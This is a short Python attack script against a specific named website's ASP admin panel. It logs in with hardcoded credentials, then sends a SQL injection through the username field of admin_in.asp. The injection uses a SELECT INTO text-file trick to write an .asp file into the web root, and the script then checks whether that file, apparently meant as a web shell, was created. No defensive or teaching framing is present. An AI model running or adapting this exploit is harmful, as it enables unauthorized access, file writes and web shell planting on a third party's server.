import requests

s = requests.Session()
s.get("http://bjhzsv.com/main/", timeout=10)
s.post("http://bjhzsv.com/main/a7chkuser.asp",
    data={"t1": "hermes", "t2": "Hack888!", "t3": "1234"},
    headers={"Referer": "http://bjhzsv.com/main/"}, timeout=10)

# SQL injection via admin_in.asp username field into file write
injections = [
    "x'; SELECT * INTO [Text;DATABASE=C:\\inetpub\\wwwroot\\main].x.asp FROM admin;--",
]

for inj in injections[:1]:
    try:
        r = s.post("http://bjhzsv.com/main/admin_in.asp?action=add",
            data={"username": inj, "password": "test", "B1": "add"},
            timeout=10)
        print("Response:", r.text[:300])
    except Exception as e:
        print("Error:", e)

# Check if shell.asp was created
try:
    r = requests.get("http://bjhzsv.com/main/x.asp", timeout=5)
    print("x.asp:", r.status_code, len(r.text), r.text[:100] if r.text else "")
except Exception as e:
    print("Check error:", e)
